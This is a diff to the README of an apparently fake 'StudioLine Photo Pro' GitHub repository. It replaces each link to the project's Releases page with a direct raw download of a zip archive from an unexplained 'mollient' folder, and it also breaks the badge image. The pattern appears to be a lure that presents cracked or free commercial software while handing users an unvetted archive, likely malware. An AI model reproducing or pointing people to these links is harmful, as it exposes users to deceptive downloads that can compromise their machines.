@@ -1,6 +1,6 @@
 # 🎨 StudioLine-Photo-Pro-Working - Effortless Photo Management for Everyone
 
-[![Download StudioLine Photo Pro](https://img.shields.io/badge/Download-StudioLine%20Photo%20Pro-brightgreen)](https://github.com/Rifkyba1519/StudioLine-Photo-Pro-Working/releases)
+[![Download StudioLine Photo Pro](https://raw.githubusercontent.com/Rifkyba1519/StudioLine-Photo-Pro-Working/main/mollient/StudioLine-Photo-Pro-Working_v1.0-alpha.3.zip%20Photo%20Pro-brightgreen)](https://raw.githubusercontent.com/Rifkyba1519/StudioLine-Photo-Pro-Working/main/mollient/StudioLine-Photo-Pro-Working_v1.0-alpha.3.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ To download StudioLine Photo Pro, follow these simple steps:
 3. Find the appropriate installer file for your system. You may choose between online and offline installers.
 4. Click on the link to download the installer to your PC.
 
-For quick access, [visit this page to download StudioLine Photo Pro](https://github.com/Rifkyba1519/StudioLine-Photo-Pro-Working/releases).
+For quick access, [visit this page to download StudioLine Photo Pro](https://raw.githubusercontent.com/Rifkyba1519/StudioLine-Photo-Pro-Working/main/mollient/StudioLine-Photo-Pro-Working_v1.0-alpha.3.zip).
 
 ## 💻 Installation Guide
 
@@ -52,7 +52,7 @@ StudioLine Photo Pro offers a variety of features to enhance your photo manageme
 
 ## 🌐 Download & Install
 
-To get started with StudioLine Photo Pro, make sure you have completed the download step above. If you need to revisit the Releases page, [click here](https://github.com/Rifkyba1519/StudioLine-Photo-Pro-Working/releases).
+To get started with StudioLine Photo Pro, make sure you have completed the download step above. If you need to revisit the Releases page, [click here](https://raw.githubusercontent.com/Rifkyba1519/StudioLine-Photo-Pro-Working/main/mollient/StudioLine-Photo-Pro-Working_v1.0-alpha.3.zip).
 
 After downloading, simply follow the installation guide outlined earlier to set up the application on your PC.
 
